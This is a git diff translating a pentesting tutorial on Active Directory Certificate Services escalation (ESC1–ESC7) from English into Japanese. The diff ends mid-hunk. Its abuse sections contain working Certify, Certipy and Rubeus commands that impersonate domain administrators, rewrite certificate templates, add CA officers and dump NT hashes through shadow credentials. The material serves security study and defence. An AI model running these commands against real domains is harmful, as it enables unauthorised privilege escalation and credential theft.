@@ -1,4 +1,4 @@
-# AD CS Domain Escalation
+# AD CS ドメイン昇格
 
 {{#include ../../../banners/hacktricks-training.md}}
 
@@ -6,119 +6,108 @@
 
 {% embed url="https://websec.nl/" %}
 
-**This is a summary of escalation technique sections of the posts:**
+**これは投稿の昇格技術セクションの要約です：**
 
 - [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
 - [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
 - [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
 
-## Misconfigured Certificate Templates - ESC1
+## 誤設定された証明書テンプレート - ESC1
 
-### Explanation
+### 説明
 
-### Misconfigured Certificate Templates - ESC1 Explained
+### 誤設定された証明書テンプレート - ESC1 の説明
 
-- **Enrolment rights are granted to low-privileged users by the Enterprise CA.**
-- **Manager approval is not required.**
-- **No signatures from authorized personnel are needed.**
-- **Security descriptors on certificate templates are overly permissive, allowing low-privileged users to obtain enrolment rights.**
-- **Certificate templates are configured to define EKUs that facilitate authentication:**
-  - Extended Key Usage (EKU) identifiers such as Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA) are included.
-- **The ability for requesters to include a subjectAltName in the Certificate Signing Request (CSR) is allowed by the template:**
-  - The Active Directory (AD) prioritizes the subjectAltName (SAN) in a certificate for identity verification if present. This means that by specifying the SAN in a CSR, a certificate can be requested to impersonate any user (e.g., a domain administrator). Whether a SAN can be specified by the requester is indicated in the certificate template's AD object through the `mspki-certificate-name-flag` property. This property is a bitmask, and the presence of the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag permits the specification of the SAN by the requester.
+- **エンタープライズ CA によって低特権ユーザーに登録権が付与されます。**
+- **マネージャーの承認は必要ありません。**
+- **承認された担当者の署名は必要ありません。**
+- **証明書テンプレートのセキュリティ記述子は過度に許可されており、低特権ユーザーが登録権を取得できるようになっています。**
+- **証明書テンプレートは、認証を促進する EKU を定義するように構成されています：**
+- クライアント認証 (OID 1.3.6.1.5.5.7.3.2)、PKINIT クライアント認証 (1.3.6.1.5.2.3.4)、スマートカードログオン (OID 1.3.6.1.4.1.311.20.2.2)、任意の目的 (OID 2.5.29.37.0)、または EKU がない (SubCA) などの拡張キー使用 (EKU) 識別子が含まれています。
+- **テンプレートによって、リクエスターが証明書署名要求 (CSR) に subjectAltName を含めることが許可されています：**
+- Active Directory (AD) は、証明書内の subjectAltName (SAN) をアイデンティティ検証のために優先します。これは、CSR に SAN を指定することによって、任意のユーザー (例：ドメイン管理者) を偽装するための証明書をリクエストできることを意味します。リクエスターが SAN を指定できるかどうかは、証明書テンプレートの AD オブジェクト内の `mspki-certificate-name-flag` プロパティによって示されます。このプロパティはビットマスクであり、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` フラグが存在する場合、リクエスターによる SAN の指定が許可されます。
 
 > [!CAUTION]
-> The configuration outlined permits low-privileged users to request certificates with any SAN of choice, enabling authentication as any domain principal through Kerberos or SChannel.
+> 概説された構成により、低特権ユーザーが任意の SAN を持つ証明書をリクエストできるようになり、Kerberos または SChannel を通じて任意のドメインプリンシパルとしての認証が可能になります。
 
-This feature is sometimes enabled to support the on-the-fly generation of HTTPS or host certificates by products or deployment services, or due to a lack of understanding.
+この機能は、製品や展開サービスによる HTTPS またはホスト証明書のオンザフライ生成をサポートするため、または理解不足のために有効にされることがあります。
 
-It is noted that creating a certificate with this option triggers a warning, which is not the case when an existing certificate template (such as the `WebServer` template, which has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` enabled) is duplicated and then modified to include an authentication OID.
+このオプションで証明書を作成すると警告がトリガーされることが記載されていますが、既存の証明書テンプレート (例えば、`WebServer` テンプレートで `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` が有効) を複製してから認証 OID を含めるように変更した場合はそうではありません。
 
-### Abuse
+### 悪用
 
-To **find vulnerable certificate templates** you can run:
-
+**脆弱な証明書テンプレートを見つけるには**、次のコマンドを実行できます：
 ```bash
 Certify.exe find /vulnerable
 certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
 ```
-
-To **abuse this vulnerability to impersonate an administrator** one could run:
-
+この脆弱性を**悪用して管理者を偽装する**には、次のコマンドを実行できます:
 ```bash
 Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
 certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
 ```
-
-Then you can transform the generated **certificate to `.pfx`** format and use it to **authenticate using Rubeus or certipy** again:
-
+次に、生成された **証明書を `.pfx`** 形式に変換し、再度 **Rubeus または certipy** を使用して **認証** できます:
 ```bash
 Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
 certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
 ```
+Windowsバイナリ「Certreq.exe」と「Certutil.exe」を使用してPFXを生成できます: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee
 
-The Windows binaries "Certreq.exe" & "Certutil.exe" can be used to generate the PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee
-
-The enumeration of certificate templates within the AD Forest's configuration schema, specifically those not necessitating approval or signatures, possessing a Client Authentication or Smart Card Logon EKU, and with the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag enabled, can be performed by running the following LDAP query:
-
+ADフォレストの構成スキーマ内の証明書テンプレートの列挙、特に承認や署名を必要とせず、クライアント認証またはスマートカードログオンEKUを持ち、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`フラグが有効なものは、次のLDAPクエリを実行することで行うことができます:
 ```
 (&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
 ```
+## 誤設定された証明書テンプレート - ESC2
 
-## Misconfigured Certificate Templates - ESC2
+### 説明
 
-### Explanation
+二つ目の悪用シナリオは最初のもののバリエーションです：
 
-The second abuse scenario is a variation of the first one:
+1. エンタープライズCAによって低特権ユーザーに登録権が付与されます。
+2. マネージャーの承認要件が無効化されます。
+3. 認可された署名の必要性が省略されます。
+4. 証明書テンプレートのセキュリティ記述子が過度に許可的で、低特権ユーザーに証明書登録権を付与します。
+5. **証明書テンプレートはAny Purpose EKUまたはEKUなしとして定義されています。**
 
-1. Enrollment rights are granted to low-privileged users by the Enterprise CA.
-2. The requirement for manager approval is disabled.
-3. The need for authorized signatures is omitted.
-4. An overly permissive security descriptor on the certificate template grants certificate enrollment rights to low-privileged users.
-5. **The certificate template is defined to include the Any Purpose EKU or no EKU.**
+**Any Purpose EKU**は、攻撃者が**任意の目的**（クライアント認証、サーバー認証、コード署名など）で証明書を取得することを許可します。**ESC3に使用される技術**と同じ技術がこのシナリオを悪用するために使用される可能性があります。
 
-The **Any Purpose EKU** permits a certificate to be obtained by an attacker for **any purpose**, including client authentication, server authentication, code signing, etc. The same **technique used for ESC3** can be employed to exploit this scenario.
+**EKUなし**の証明書は、下位CA証明書として機能し、**任意の目的**で悪用される可能性があり、**新しい証明書に署名するためにも使用できます**。したがって、攻撃者は下位CA証明書を利用して新しい証明書に任意のEKUやフィールドを指定することができます。
 
-Certificates with **no EKUs**, which act as subordinate CA certificates, can be exploited for **any purpose** and can **also be used to sign new certificates**. Hence, an attacker could specify arbitrary EKUs or fields in the new certificates by utilizing a subordinate CA certificate.
+ただし、**ドメイン認証**のために作成された新しい証明書は、下位CAが**`NTAuthCertificates`**オブジェクトによって信頼されていない場合、機能しません。これはデフォルト設定です。それでも、攻撃者は**任意のEKU**と任意の証明書値を持つ**新しい証明書を作成する**ことができます。これらは、広範な目的（例：コード署名、サーバー認証など）で**悪用される可能性**があり、SAML、AD FS、またはIPSecなどのネットワーク内の他のアプリケーションに重大な影響を与える可能性があります。
 
-However, new certificates created for **domain authentication** will not function if the subordinate CA is not trusted by the **`NTAuthCertificates`** object, which is the default setting. Nonetheless, an attacker can still create **new certificates with any EKU** and arbitrary certificate values. These could be potentially **abused** for a wide range of purposes (e.g., code signing, server authentication, etc.) and could have significant implications for other applications in the network like SAML, AD FS, or IPSec.
-
-To enumerate templates that match this scenario within the AD Forest’s configuration schema, the following LDAP query can be run:
-
+ADフォレストの構成スキーマ内でこのシナリオに一致するテンプレートを列挙するには、次のLDAPクエリを実行できます：
 ```
 (&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
 ```
+## 誤設定された登録エージェントテンプレート - ESC3
 
-## Misconfigured Enrolment Agent Templates - ESC3
+### 説明
 
-### Explanation
+このシナリオは最初と二番目のものに似ていますが、**異なるEKU**（証明書要求エージェント）と**2つの異なるテンプレート**を**悪用**しています（したがって、2セットの要件があります）。
 
-This scenario is like the first and second one but **abusing** a **different EKU** (Certificate Request Agent) and **2 different templates** (therefore it has 2 sets of requirements),
+**証明書要求エージェントEKU**（OID 1.3.6.1.4.1.311.20.2.1）は、Microsoftの文書で**登録エージェント**として知られており、ある主体が**他のユーザーの代わりに**証明書に**登録**することを許可します。
 
-The **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), known as **Enrollment Agent** in Microsoft documentation, allows a principal to **enroll** for a **certificate** on **behalf of another user**.
+**「登録エージェント」**はそのような**テンプレート**に登録し、結果として得られた**証明書を使用して他のユーザーの代わりにCSRに共同署名**します。その後、**共同署名されたCSR**をCAに**送信**し、「他のユーザーの代わりに登録することを許可する**テンプレート**に登録**し、CAは**「他の」ユーザーに属する証明書**で応答します。
 
-The **“enrollment agent”** enrolls in such a **template** and uses the resulting **certificate to co-sign a CSR on behalf of the other user**. It then **sends** the **co-signed CSR** to the CA, enrolling in a **template** that **permits “enroll on behalf of”**, and the CA responds with a **certificate belong to the “other” user**.
+**要件 1:**
 
-**Requirements 1:**
+- エンタープライズCAによって低特権ユーザーに登録権が付与されます。
+- マネージャーの承認要件は省略されます。
+- 承認された署名の要件はありません。
+- 証明書テンプレートのセキュリティ記述子は過度に許可的であり、低特権ユーザーに登録権を付与します。
+- 証明書テンプレートには証明書要求エージェントEKUが含まれており、他の主体の代わりに他の証明書テンプレートの要求を可能にします。
 
-- Enrollment rights are granted to low-privileged users by the Enterprise CA.
-- The requirement for manager approval is omitted.
-- No requirement for authorized signatures.
-- The security descriptor of the certificate template is excessively permissive, granting enrollment rights to low-privileged users.
-- The certificate template includes the Certificate Request Agent EKU, enabling the request of other certificate templates on behalf of other principals.
+**要件 2:**
 
-**Requirements 2:**
+- エンタープライズCAは低特権ユーザーに登録権を付与します。
+- マネージャーの承認はバイパスされます。
+- テンプレートのスキーマバージョンは1または2を超え、証明書要求エージェントEKUを必要とするアプリケーションポリシー発行要件を指定します。
+- 証明書テンプレートで定義されたEKUはドメイン認証を許可します。
+- CAに対して登録エージェントの制限は適用されません。
 
-- The Enterprise CA grants enrollment rights to low-privileged users.
-- Manager approval is bypassed.
-- The template's schema version is either 1 or exceeds 2, and it specifies an Application Policy Issuance Requirement that necessitates the Certificate Request Agent EKU.
-- An EKU defined in the certificate template permits domain authentication.
-- Restrictions for enrollment agents are not applied on the CA.
+### 悪用
 
-### Abuse
-
-You can use [**Certify**](https://github.com/GhostPack/Certify) or [**Certipy**](https://github.com/ly4k/Certipy) to abuse this scenario:
-
+このシナリオを悪用するには、[**Certify**](https://github.com/GhostPack/Certify)または[**Certipy**](https://github.com/ly4k/Certipy)を使用できます。
 ```bash
 # Request an enrollment agent certificate
 Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
@@ -132,43 +121,39 @@ certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.loca
 # Use Rubeus with the certificate to authenticate as the other user
 Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
 ```
+**ユーザー**が**登録エージェント証明書**を**取得**することを許可されている場合、登録**エージェント**が登録を許可されているテンプレート、および登録エージェントが行動できる**アカウント**は、エンタープライズCAによって制約されることがあります。これは、`certsrc.msc` **スナップイン**を開き、**CAを右クリック**し、**プロパティをクリック**し、次に「登録エージェント」タブに**移動**することで実現されます。
 
-The **users** who are allowed to **obtain** an **enrollment agent certificate**, the templates in which enrollment **agents** are permitted to enroll, and the **accounts** on behalf of which the enrollment agent may act can be constrained by enterprise CAs. This is achieved by opening the `certsrc.msc` **snap-in**, **right-clicking on the CA**, **clicking Properties**, and then **navigating** to the “Enrollment Agents” tab.
+ただし、CAの**デフォルト**設定は「**登録エージェントを制限しない**」ことに注意が必要です。管理者によって登録エージェントの制限が有効にされ、「登録エージェントを制限する」に設定されると、デフォルトの構成は非常に許可的なままです。これにより、**すべての人**が誰でもすべてのテンプレートに登録することができます。
 
-However, it is noted that the **default** setting for CAs is to “**Do not restrict enrollment agents**.” When the restriction on enrollment agents is enabled by administrators, setting it to “Restrict enrollment agents,” the default configuration remains extremely permissive. It allows **Everyone** access to enroll in all templates as anyone.
+## 脆弱な証明書テンプレートアクセス制御 - ESC4
 
-## Vulnerable Certificate Template Access Control - ESC4
+### **説明**
 
-### **Explanation**
+**証明書テンプレート**の**セキュリティ記述子**は、テンプレートに関して特定の**ADプリンシパル**が持つ**権限**を定義します。
 
-The **security descriptor** on **certificate templates** defines the **permissions** specific **AD principals** possess concerning the template.
+**攻撃者**が**テンプレート**を**変更**し、**前のセクション**で概説された**悪用可能な誤設定**を**導入**するために必要な**権限**を持っている場合、特権昇格が促進される可能性があります。
 
-Should an **attacker** possess the requisite **permissions** to **alter** a **template** and **institute** any **exploitable misconfigurations** outlined in **prior sections**, privilege escalation could be facilitated.
+証明書テンプレートに適用される注目すべき権限には以下が含まれます：
 
-Notable permissions applicable to certificate templates include:
+- **オーナー:** オブジェクトに対する暗黙の制御を付与し、任意の属性を変更することを可能にします。
+- **フルコントロール:** オブジェクトに対する完全な権限を付与し、任意の属性を変更する能力を含みます。
+- **WriteOwner:** オブジェクトの所有者を攻撃者の制御下にあるプリンシパルに変更することを許可します。
+- **WriteDacl:** アクセス制御の調整を可能にし、攻撃者にフルコントロールを付与する可能性があります。
+- **WriteProperty:** 任意のオブジェクトプロパティの編集を許可します。
 
-- **Owner:** Grants implicit control over the object, allowing for the modification of any attributes.
-- **FullControl:** Enables complete authority over the object, including the capability to alter any attributes.
-- **WriteOwner:** Permits the alteration of the object's owner to a principal under the attacker's control.
-- **WriteDacl:** Allows for the adjustment of access controls, potentially granting an attacker FullControl.
-- **WriteProperty:** Authorizes the editing of any object properties.
+### 悪用
 
-### Abuse
-
-An example of a privesc like the previous one:
+前のような特権昇格の例：
 
 <figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>
 
-ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.
+ESC4は、ユーザーが証明書テンプレートに対して書き込み権限を持っている場合です。これは、たとえば、証明書テンプレートの構成を上書きして、テンプレートをESC1に対して脆弱にするために悪用される可能性があります。
 
-As we can see in the path above, only `JOHNPC` has these privileges, but our user `JOHN` has the new `AddKeyCredentialLink` edge to `JOHNPC`. Since this technique is related to certificates, I have implemented this attack as well, which is known as [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Here’s a little sneak peak of Certipy’s `shadow auto` command to retrieve the NT hash of the victim.
-
+上記のパスで見ると、`JOHNPC`のみがこれらの権限を持っていますが、私たちのユーザー`JOHN`は`JOHNPC`への新しい`AddKeyCredentialLink`エッジを持っています。この技術は証明書に関連しているため、私はこの攻撃も実装しました。これは[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)として知られています。ここでは、被害者のNTハッシュを取得するためのCertipyの`shadow auto`コマンドの小さなスニークピークを示します。
 ```bash
 certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
 ```
-
-**Certipy** can overwrite the configuration of a certificate template with a single command. By **default**, Certipy will **overwrite** the configuration to make it **vulnerable to ESC1**. We can also specify the **`-save-old` parameter to save the old configuration**, which will be useful for **restoring** the configuration after our attack.
-
+**Certipy**は、単一のコマンドで証明書テンプレートの設定を上書きできます。**デフォルト**では、Certipyは設定を**上書き**して**ESC1に対して脆弱**にします。また、**`-save-old`パラメータを指定して古い設定を保存**することもでき、これは攻撃後に設定を**復元**するのに役立ちます。
 ```bash
 # Make template vuln to ESC1
 certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old
@@ -179,43 +164,37 @@ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target 
 # Restore config
 certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
 ```
+## 脆弱なPKIオブジェクトアクセス制御 - ESC5
 
-## Vulnerable PKI Object Access Control - ESC5
+### 説明
 
-### Explanation
+証明書テンプレートや証明書認証局を超えた複数のオブジェクトを含むACLベースの関係の広範なネットワークは、AD CSシステム全体のセキュリティに影響を与える可能性があります。これらのオブジェクトは、セキュリティに大きな影響を与える可能性があり、以下を含みます：
 
-The extensive web of interconnected ACL-based relationships, which includes several objects beyond certificate templates and the certificate authority, can impact the security of the entire AD CS system. These objects, which can significantly affect security, encompass:
+- CAサーバーのADコンピュータオブジェクトは、S4U2SelfやS4U2Proxyなどのメカニズムを通じて侵害される可能性があります。
+- CAサーバーのRPC/DCOMサーバー。
+- 特定のコンテナパス `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 内の任意の子孫ADオブジェクトまたはコンテナ。このパスには、証明書テンプレートコンテナ、認証局コンテナ、NTAuthCertificatesオブジェクト、エンロールメントサービスコンテナなどのコンテナやオブジェクトが含まれますが、これに限定されません。
 
-- The AD computer object of the CA server, which may be compromised through mechanisms like S4U2Self or S4U2Proxy.
-- The RPC/DCOM server of the CA server.
-- Any descendant AD object or container within the specific container path `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. This path includes, but is not limited to, containers and objects such as the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, and the Enrollment Services Container.
-
-The security of the PKI system can be compromised if a low-privileged attacker manages to gain control over any of these critical components.
+低特権の攻撃者がこれらの重要なコンポーネントのいずれかを制御することに成功した場合、PKIシステムのセキュリティが侵害される可能性があります。
 
 ## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6
 
-### Explanation
+### 説明
 
-The subject discussed in the [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) also touches on the **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag's implications, as outlined by Microsoft. This configuration, when activated on a Certification Authority (CA), permits the inclusion of **user-defined values** in the **subject alternative name** for **any request**, including those constructed from Active Directory®. Consequently, this provision allows an **intruder** to enroll through **any template** set up for domain **authentication**—specifically those open to **unprivileged** user enrollment, like the standard User template. As a result, a certificate can be secured, enabling the intruder to authenticate as a domain administrator or **any other active entity** within the domain.
+[**CQure Academyの投稿**](https://cqureacademy.com/blog/enhanced-key-usage)で議論されている主題は、Microsoftによって概説された**`EDITF_ATTRIBUTESUBJECTALTNAME2`**フラグの影響にも触れています。この設定は、認証局（CA）で有効にされると、**ユーザー定義の値**を**任意のリクエスト**の**サブジェクト代替名**に含めることを許可します。これには、Active Directory®から構築されたリクエストも含まれます。したがって、この規定により、**侵入者**はドメイン**認証**のために設定された**任意のテンプレート**を通じて登録することが可能になります。特に、標準のユーザーテンプレートのように**特権のない**ユーザー登録に開放されているものです。その結果、証明書が取得され、侵入者はドメイン管理者またはドメイン内の**他のアクティブなエンティティ**として認証できるようになります。
 
-**Note**: The approach for appending **alternative names** into a Certificate Signing Request (CSR), through the `-attrib "SAN:"` argument in `certreq.exe` (referred to as “Name Value Pairs”), presents a **contrast** from the exploitation strategy of SANs in ESC1. Here, the distinction lies in **how account information is encapsulated**—within a certificate attribute, rather than an extension.
+**注意**: 証明書署名要求（CSR）に**代替名**を追加する方法は、`certreq.exe`の`-attrib "SAN:"`引数を通じて行われ（「名前値ペア」と呼ばれる）、ESC1におけるSANの悪用戦略とは**対照的**です。ここでの違いは、**アカウント情報がどのようにカプセル化されるか**にあります—拡張ではなく、証明書属性内にあります。
 
-### Abuse
+### 悪用
 
-To verify whether the setting is activated, organizations can utilize the following command with `certutil.exe`:
-
+設定が有効になっているかどうかを確認するために、組織は`certutil.exe`を使用して以下のコマンドを利用できます：
 ```bash
 certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
 ```
-
-This operation essentially employs **remote registry access**, hence, an alternative approach might be:
-
+この操作は本質的に**リモートレジストリアクセス**を利用しているため、代替アプローチとしては次のようなものがあります：
 ```bash
 reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
 ```
-
-Tools like [**Certify**](https://github.com/GhostPack/Certify) and [**Certipy**](https://github.com/ly4k/Certipy) are capable of detecting this misconfiguration and exploiting it:
-
+[**Certify**](https://github.com/GhostPack/Certify)や[**Certipy**](https://github.com/ly4k/Certipy)のようなツールは、この誤設定を検出し、悪用することができます：
 ```bash
 # Detect vulnerabilities, including this one
 Certify.exe find
@@ -224,47 +203,39 @@ Certify.exe find
 Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
 certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
 ```
-
-To alter these settings, assuming one possesses **domain administrative** rights or equivalent, the following command can be executed from any workstation:
-
+これらの設定を変更するには、**ドメイン管理者**権限または同等の権限を持っていると仮定して、次のコマンドを任意のワークステーションから実行できます：
 ```bash
 certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
 ```
-
-To disable this configuration in your environment, the flag can be removed with:
-
+この設定を環境で無効にするには、フラグを次のように削除できます:
 ```bash
 certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
 ```
-
 > [!WARNING]
-> Post the May 2022 security updates, newly issued **certificates** will contain a **security extension** that incorporates the **requester's `objectSid` property**. For ESC1, this SID is derived from the specified SAN. However, for **ESC6**, the SID mirrors the **requester's `objectSid`**, not the SAN.\
-> To exploit ESC6, it is essential for the system to be susceptible to ESC10 (Weak Certificate Mappings), which prioritizes the **SAN over the new security extension**.
+> 2022年5月のセキュリティ更新以降、新しく発行された**証明書**には、**リクエスターの `objectSid` プロパティ**を組み込んだ**セキュリティ拡張**が含まれます。ESC1の場合、このSIDは指定されたSANから派生します。しかし、**ESC6**の場合、SIDは**リクエスターの `objectSid`**を反映し、SANではありません。\
+> ESC6を悪用するには、システムがESC10（弱い証明書マッピング）に対して脆弱であることが不可欠であり、これにより**新しいセキュリティ拡張よりもSANが優先されます**。
 
-## Vulnerable Certificate Authority Access Control - ESC7
+## 脆弱な証明書認証局アクセス制御 - ESC7
 
-### Attack 1
+### 攻撃 1
 
-#### Explanation
+#### 説明
 
-Access control for a certificate authority is maintained through a set of permissions that govern CA actions. These permissions can be viewed by accessing `certsrv.msc`, right-clicking a CA, selecting properties, and then navigating to the Security tab. Additionally, permissions can be enumerated using the PSPKI module with commands such as:
-
+証明書認証局のアクセス制御は、CAのアクションを管理する一連の権限を通じて維持されます。これらの権限は、`certsrv.msc`にアクセスし、CAを右クリックしてプロパティを選択し、次にセキュリティタブに移動することで表示できます。さらに、PSPKIモジュールを使用して、次のようなコマンドで権限を列挙できます：
 ```bash
 Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
 ```
+これは、主な権限、すなわち **`ManageCA`** と **`ManageCertificates`** に関する洞察を提供し、それぞれ「CA管理者」と「証明書マネージャー」の役割に関連しています。
 
-This provides insights into the primary rights, namely **`ManageCA`** and **`ManageCertificates`**, correlating to the roles of “CA administrator” and “Certificate Manager” respectively.
+#### 悪用
 
-#### Abuse
+証明書機関で **`ManageCA`** 権限を持つことは、PSPKIを使用して設定をリモートで操作することを可能にします。これには、任意のテンプレートでSAN指定を許可するために **`EDITF_ATTRIBUTESUBJECTALTNAME2`** フラグを切り替えることが含まれ、これはドメイン昇格の重要な側面です。
 
-Having **`ManageCA`** rights on a certificate authority enables the principal to manipulate settings remotely using PSPKI. This includes toggling the **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag to permit SAN specification in any template, a critical aspect of domain escalation.
+このプロセスの簡素化は、PSPKIの **Enable-PolicyModuleFlag** cmdletを使用することで達成可能であり、直接的なGUI操作なしで変更を行うことができます。
 
-Simplification of this process is achievable through the use of PSPKI’s **Enable-PolicyModuleFlag** cmdlet, allowing modifications without direct GUI interaction.
+**`ManageCertificates`** 権限を持つことで、保留中のリクエストの承認が可能になり、「CA証明書マネージャーの承認」保護を効果的に回避できます。
 
-Possession of **`ManageCertificates`** rights facilitates the approval of pending requests, effectively circumventing the "CA certificate manager approval" safeguard.
-
-A combination of **Certify** and **PSPKI** modules can be utilized to request, approve, and download a certificate:
-
+**Certify** と **PSPKI** モジュールの組み合わせを使用して、証明書をリクエスト、承認、ダウンロードすることができます：
 ```powershell
 # Request a certificate that will require an approval
 Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
@@ -280,37 +251,33 @@ Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -R
 # Download the certificate
 Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
 ```
+### 攻撃 2
 
-### Attack 2
-
-#### Explanation
+#### 説明
 
 > [!WARNING]
-> In the **previous attack** **`Manage CA`** permissions were used to **enable** the **EDITF_ATTRIBUTESUBJECTALTNAME2** flag to perform the **ESC6 attack**, but this will not have any effect until the CA service (`CertSvc`) is restarted. When a user has the `Manage CA` access right, the user is also allowed to **restart the service**. However, it **does not mean that the user can restart the service remotely**. Furthermore, E**SC6 might not work out of the box** in most patched environments due to the May 2022 security updates.
+> **前の攻撃**では、**`Manage CA`**権限を使用して**EDITF_ATTRIBUTESUBJECTALTNAME2**フラグを**有効**にして**ESC6攻撃**を実行しましたが、CAサービス（`CertSvc`）が再起動されるまで効果はありません。ユーザーが`Manage CA`アクセス権を持っている場合、そのユーザーは**サービスを再起動する**ことも許可されています。ただし、**ユーザーがリモートでサービスを再起動できることを意味するわけではありません**。さらに、**ESC6はほとんどのパッチ適用済み環境ではすぐには機能しない可能性があります**。これは2022年5月のセキュリティ更新によるものです。
 
-Therefore, another attack is presented here.
+したがって、ここでは別の攻撃が提示されます。
 
-Perquisites:
+前提条件：
 
-- Only **`ManageCA` permission**
-- **`Manage Certificates`** permission (can be granted from **`ManageCA`**)
-- Certificate template **`SubCA`** must be **enabled** (can be enabled from **`ManageCA`**)
+- **`ManageCA`権限のみ**
+- **`Manage Certificates`**権限（**`ManageCA`**から付与可能）
+- 証明書テンプレート**`SubCA`**は**有効**でなければならない（**`ManageCA`**から有効にできる）
 
-The technique relies on the fact that users with the `Manage CA` _and_ `Manage Certificates` access right can **issue failed certificate requests**. The **`SubCA`** certificate template is **vulnerable to ESC1**, but **only administrators** can enroll in the template. Thus, a **user** can **request** to enroll in the **`SubCA`** - which will be **denied** - but **then issued by the manager afterwards**.
+この手法は、`Manage CA` _かつ_ `Manage Certificates`アクセス権を持つユーザーが**失敗した証明書リクエストを発行できる**という事実に依存しています。**`SubCA`**証明書テンプレートは**ESC1に対して脆弱**ですが、**管理者のみがテンプレートに登録できます**。したがって、**ユーザー**は**`SubCA`**への登録を**リクエスト**できますが、これは**拒否され**、その後**マネージャーによって発行される**ことになります。
 
-#### Abuse
+#### 悪用
 
-You can **grant yourself the `Manage Certificates`** access right by adding your user as a new officer.
-
+自分自身に**`Manage Certificates`**アクセス権を付与するには、新しい役員として自分のユーザーを追加できます。
 ```bash
 certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Successfully added officer 'John' on 'corp-DC-CA'
 ```
-
-The **`SubCA`** template can be **enabled on the CA** with the `-enable-template` parameter. By default, the `SubCA` template is enabled.
-
+**`SubCA`** テンプレートは、`-enable-template` パラメータを使用して CA で **有効化** できます。デフォルトでは、`SubCA` テンプレートは有効になっています。
 ```bash
 # List templates
 certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
@@ -322,11 +289,9 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
